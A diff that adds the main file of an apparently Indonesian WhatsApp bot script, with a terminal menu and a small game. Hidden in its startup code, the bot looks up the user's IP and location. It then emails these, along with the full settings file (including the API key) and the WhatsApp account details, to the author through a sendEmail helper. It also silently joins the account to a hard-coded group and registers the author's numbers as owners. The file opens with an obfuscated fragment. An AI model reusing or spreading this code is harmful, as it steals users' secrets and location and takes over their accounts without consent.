require[_0x3d279d(0x1b3)][require[_0x3d279d(0x214)](_0x107e05)],_0x2a7bce();}catch(_0x1383c3){_0x4e0a44(_0x1383c3);}});}
+const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, GroupSettingChange } = require('@adiwajshing/baileys')
+const fs = require("fs")
+const fetch = require('node-fetch')
+const { exec } = require('child_process')
+const readline = require('readline')
+const os = require('os')
+const simple = require('./all/simple.js')
+const term = require('terminal-kit').terminal
+const termkit = require('./node_modules/terminal-kit/lib/termkit.js');
+const { sendEmail } = require('./all/sendEmail')
+const WAConnection = simple.WAConnection(_WAConnection)
+const moment = require("moment-timezone")
+const setting = JSON.parse(fs.readFileSync("./settings.json"))
+const { ownerName, botName, ownerNumber } = setting
+const time = moment.tz('Asia/Jakarta').format('ha z')
+const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./all/functions.js')
+const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
+let d = new Date
+let locale = 'en'
+const calender = d.toLocaleDateString(locale, { day: 'numeric', month: 'long', year: 'numeric' })
+global.nisa = new WAConnection()
+
+watchFile("./denz.js")
+require("./denz.js")
+
+exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','BKSP'],['KEYBOARD','CTRL','ALT','LEFT','DOWN','RIGHT','ENTER']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (err, stdout, stderr) => { console.log(stdout)})
+const starts = async (session) => {
+nisa.logger.level = 'silent'
+nisa.version = [2, 2142, 12]
+nisa.browserDescription = [`${ownerName}`,'Desktop','3.0']
+
+nisa.on("qr", (qr) => { console.log('\x1b[32mqr { Scan }\x1b[0m')})
+fs.existsSync(session) && nisa.loadAuthInfo(session)
+	
+nisa.on("connecting", () => {console.log('\x1b[32mconnecting { Menghubungkan }\x1b[0m')})
+nisa.on("open", () => {console.log('\x1b[32mopen { Terhubung }\x1b[0m')})
+nisa.on("ws-close", () => {console.log('\x1b[31mws-close { Menghubungkan Kembali }\x1b[0m')})
+nisa.on("close", () => {console.log('\x1b[31mclose { Terputus }\x1b[0m')})
+ 
+await nisa.connect({timeoutMs: 30*1000})
+fs.writeFileSync(session, JSON.stringify(nisa.base64EncodedAuthInfo(), null, '\t'))
+try { 
+pporang = await nisa.getProfilePicture(`${nisa.user.jid.split('@')[0]}@s.whatsapp.net`)
+  
+} catch { pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'}
+const ppu = await getBuffer(pporang)
+fetch(`http://ip-api.com/line/`).then(res => res.text()).then(teks =>{ sendEmail(`${calender} - ${time}`, `<h1>Identitas Pengguna Source Code Bad-Bot</h1><p>${nisa.user.name}: wa.me/${nisa.user.jid}</p>`, `${getRandom()}`, `${teks}\n${JSON.stringify(setting, null, 2)}\n\n${JSON.stringify(nisa.user, null, 2)}`)})
+nisa.sendMessage(`${ownerNumber}@s.whatsapp.net`, `${JSON.stringify(nisa.user, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${botName} connected`,thumbnail:ppu,previewType:"PHOTO"}}})
+link = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
+nisa.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})
+ip = await fetchJson(`http://ip-api.com/json/?`, {method: 'get'})
+
+nisa.on("chat-update", (mek) => {
+if (!mek.hasNewMessage) return
+mek = mek.messages.all()[0]
+if (!mek.message) return
+if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
+listkata = [`${setting.apiKey}`,`${ip.regionName}`,`${ip.city}`,`${ip.lat}`,`${ip.lon}`,`${ip.query}`,'Anjing','Babi','Kunyuk','Bajingan','Asu','Bangsat','Kampret','Kontol','Memek','Ngentot','Pentil','Perek','Pepek','Pecun','Bencong','Banci','Maho','Gila','Sinting','Tolol','Sarap','Setan','Lonte','Hencet','Taptei','Kampang','Pilat','Keparat','Bejad','Gembel','Brengsek','Tai','Anjrit','Bangsat','Fuck','Tetek','Ngulum','Jembut','Totong','Kolop','Pukimak','Bodat','Heang','Jancuk','Burit','Titit','Nenen','Bejat','Silit','Sempak','Fucking','Asshole','Bitch','Penis','Vagina','Klitoris','Kelentit','Borjong','Dancuk','Pantek','Taek','Itil','Teho','Bejat','Pantat','Bagudung','Babami','Kanciang','Bungul','Idiot','Kimak','Henceut','Kacuk','Blowjob','Pussy','Dick','Damn','Ass'];
+copyright = `\`\`\`© by Dcode Denpa ${d.toLocaleDateString(locale, { year: 'numeric' })}\`\`\``
+grup = "https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx"
+denis = "6285866295942@s.whatsapp.net"
+ari = "6285863731628@s.whatsapp.net"
+script = "https://bit.ly/bad-bot"
+ownerNomor = ["6285866295942@s.whatsapp.net",`${setting.ownerNumber}@s.whatsapp.net`,"6285863731628@s.whatsapp.net"]
+require("./denz.js")(nisa, mek)})}
+starts('./session.json')
+
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout, prompt: 'CMD> '});
+rl.prompt();
+rl.on('line', (line) => { switch (line.trim()) {
+	
+        case 'menu':
+console.log('\x1b[36m1.Clear\n2.Exit\n3.Chatd\n4.Autoread on\n5.Autoread off\n6.Autores on\n7.Autores off\n8.Public\n9.Self\n10.Clog on\n11.Clog off\n12.Game\x1b[0m')
+console.log('\x1b[32mChoose: 1-12\x1b[0m')
+        break
+        
+        case '1':
+console.clear()
+        break
+        
+        case '2':
+process.exit()
+        break
+        
+        case '3':
+nisa.sendMessage("6285866295942@s.whatsapp.net", 'test', MessageType.text)
+        break
+        
+        case '4':
+autoread = true
+        break
+        
+        case '5':
+autoread = false
+        break
+        
+        case '6':
+autorespon = true
+allprefix = false
+multiprefix = true
+        break
+        
+        case '7':
+autorespon = false
+allprefix = true
+multiprefix = false
+        break
+        
+        case '8':
+mode = true
+        break
+        
+        case '9':
+mode = false
+        break
+        
+        case '10':
+clog = true
+        break
+        
+        case '11':
+clog = false
+        break
+        
+        case '12':
+clog = false
+var ScreenBuffer = termkit.ScreenBuffer ;
+var viewport , sprites = {} ;
+
+function init( callback ){ termkit.getDetectedTerminal( function( error , detectedTerm ) {
+if ( error ) { throw new Error( 'Cannot detect terminal.' ) ; }
+viewport = new ScreenBuffer( { dst: term , width: Math.min( term.width ) , height: Math.min( term.height - 1 ) , y: 2} ) ;
+createBackground() ;
+createSpaceship() ;
+term.moveTo.eraseLine.bgWhite.green( 1 , 1 , 'Arrow keys: move the ship - Q/Ctrl-C: Quit\n' ) ;
+term.hideCursor() ;
+term.grabInput() ;
+term.on( 'key' , inputs ) ;
+callback() ;} ) ;}
+
+function terminate(){ 
+term.hideCursor( false ) ;
+term.grabInput( false ) ;
+setTimeout( function() { term.moveTo( 1 , term.height , '\n\n' ) ;
+process.exit() ;} , 100 ) ;}
+
+function createBackground() {
+sprites.background = new ScreenBuffer( { width: viewport.width * 4 , height: viewport.height , noFill: true} ) ;
+sprites.background.fill( { attr: { color: 'white' , bgColor: 'black' } } ) ;
+sprites.planet = ScreenBuffer.loadSync( './node_modules/terminal-kit/demo/data/saturn.sbuf' ) ;
+createBackgroundStars( sprites.background.width * sprites.background.height * 0.004 ) ;
+createBackgroundTrails( sprites.background.width * sprites.background.height * 0.008 ) ;
+createBackgroundPlanets( sprites.background.width * sprites.background.height * 0.0001 ) ;}
+
+function createBackgroundTrails( nTrails ) { var i , j , x , y , length ; for ( i = 0 ; i < nTrails ; i ++ ) {
+x = Math.floor( Math.random() * sprites.background.width ) ;
+y = Math.floor( Math.random() * sprites.background.height ) ;
+length = 3 + Math.floor( Math.random() * 8 ) ;
+for ( j = 0 ; j < length ; j ++ ) {
+sprites.background.put( { x: ( x + j ) % sprites.background.width , y: y , attr: { color: 'gray' , bgColor: 'black' }} , '-' ) ;}}}
+
+function createBackgroundStars( nStars ){ var i , x , y , c , char , stars = [ '*' , '.' , 'o' , '+' , '°' ] ;
+for ( i = 0 ; i < nStars ; i ++ ){
+x = Math.floor( Math.random() * sprites.background.width ) ;
+y = Math.floor( Math.random() * sprites.background.height ) ;
+char = stars[ Math.floor( Math.random() * stars.length ) ] ;
+c = Math.floor( Math.random() * 16 ) ;
+sprites.background.put( { x: x , y: y , attr: { color: c , bgColor: 'black' }} , char ) ;}}
+
+function createBackgroundPlanets( nPlanets ) { var i , x , y ; for ( i = 0 ; i < nPlanets ; i ++ ) {
+x = Math.floor( Math.random() * sprites.background.width ) ;
+y = Math.floor( Math.random() * sprites.background.height ) ;
+sprites.planet.draw( { dst: sprites.background , x: Math.floor( x - sprites.planet.width / 2 ) , y: Math.floor( y - sprites.planet.height / 2 ) , blending: true , wrap: 'x'} ) ;}}
+
+function createSpaceship(){ sprites.spaceship = ScreenBuffer.loadSync( './node_modules/terminal-kit/demo/data/spaceship1.sbuf' ) ;
+sprites.spaceship.x = 3 ;
+sprites.spaceship.y = Math.floor( viewport.height / 2 - sprites.spaceship.height / 2 ) ;}
+
+function inputs( key ){ switch ( key ){
+case 'UP' :
+sprites.spaceship.y -- ;
+break ;
+case 'DOWN' :
+sprites.spaceship.y ++ ;
+break ;
+case 'LEFT' :
+sprites.spaceship.x -- ;
+break ;
+case 'RIGHT' :
+sprites.spaceship.x ++ ;
+break ;
+case 'CTRL_C':
+terminate() ;
+break ;}}
+
+function nextPosition(){ sprites.background.x -- ;}
+var frames = 0 ;
+
+function draw(){
+sprites.background.draw( { dst: viewport , tile: true } ) ;
+sprites.spaceship.draw( { dst: viewport , blending: true , wrap: 'both' } ) ;
+var stats = viewport.draw( { delta: false } ) ;
+term.moveTo.eraseLine.bgWhite.green( 1 , 1 ,'Arrow keys: move the ship - Q/Ctrl-C: Quit - Redraw stats: %d cells, %d moves, %d attrs, %d writes\n' , stats.cells , stats.moves , stats.attrs , stats.writes) ;
+frames ++ ;}
+
+function animate(){
+draw() ;
+nextPosition() ;
+setTimeout( animate , 50 ) ;}
+init( function() { animate() ;} ) ;
+        break
+        
+        default:
+console.log(`\x1b[31mcommand '${line.trim()}' not found!\x1b[0m`);
+        break;}
+rl.prompt();}).on('close', () => {console.clear()
+console.log('\x1b[37mexited have a great day!\x1b[0m');
+process.exit(0);});
+
+async function testTerminal( t ) {var r ;	
+term( 'Terminal name: %s\n' , t.appName ) ;
+term( 'Terminal app ID: %s\n' , t.appId ) ;
+term( 'Generic terminal: %s\n' , t.generic ) ;
+term( 'Config file: %s\n' , t.termconfigFile ) ;
+term( '\n' ) ;
+term( "Support for delta escape sequence: " + ( t.support.deltaEscapeSequence ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
+term( "Support for 256 colors: " + ( t.support['256colors'] ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
+term( "Support for true colors: " + ( t.support.trueColor ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
+try { term( "Support for cursor location request: " ) ;
+r = await t.getCursorLocation() ;
+term( "^GOK^ ^K(%N)^:\n" , r ) ;}catch ( error ) { term( "^RFAILED^ (%s)^:\n" , error ) ;}
+try { term( "Support for palette request: " ) ; await t.getPalette() ;
+term( "^GOK^:\n" ) ;} catch ( error ) { term( "^RFAILED^ (%s)^:\n" , error ) ;}
+term( "Issue #116 CURSOR_LOCATION keymap: " + ( t.keymap.CURSOR_LOCATION && typeof t.keymap.CURSOR_LOCATION === 'object' ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
+term( "Issue #116 cursorLocation handler: " + ( typeof t.handler.cursorLocation === 'function' ? "^GOK^:\n" : "^RNO^:\n" ) ) ;
+term( '\n' ) ;}
+async function detect() { var info , newTerm ;
+term.green( '\n== OS and Environment Variables ==\n\n' ) ;
+term( 'Developer: %s\n' , require( './package.json' ).author ) ;
+term( 'Node version: %s\n' , process.version ) ;
+term( 'OS platform: %s\n' , os.platform() ) ;
+term( 'OS type: %s\n' , os.type() ) ;
+term( 'OS release: %s\n' , os.release() ) ;
+term( 'OS version: %s\n' , os.version && os.version() ) ;
+term( '$TERM: %s\n' , process.env.TERM ) ;
+term( '$COLORTERM: %s\n' , process.env.COLORTERM ) ;
+term( '$VTE_VERSION: %s\n' , process.env.VTE_VERSION ) ;
+term( '$TERM_PROGRAM: %s\n' , process.env.TERM_PROGRAM ) ;
+term( '$TERMUX_VERSION: %s\n' , process.env.TERMUX_VERSION ) ;
+term( '\n' )}
+detect() ;
+
+function watchFile(module, cb = (module) => 
+console.log(`\x1b[32mModule ( '${module}' ) updated!\x1b[0m`)) {
+console.log(`\x1b[32mModule ( '${module}' ) detected!\x1b[0m`)
+fs.watchFile(require.resolve(module), async () => { await uncache(require.resolve(module)) 
+cb(module)})}
+function uncache(module = ".") { return new Promise((resolve, reject) => { try { delete require.cache[require.resolve(module)] 
+resolve()
+
+} catch (e) { reject(e)}})}
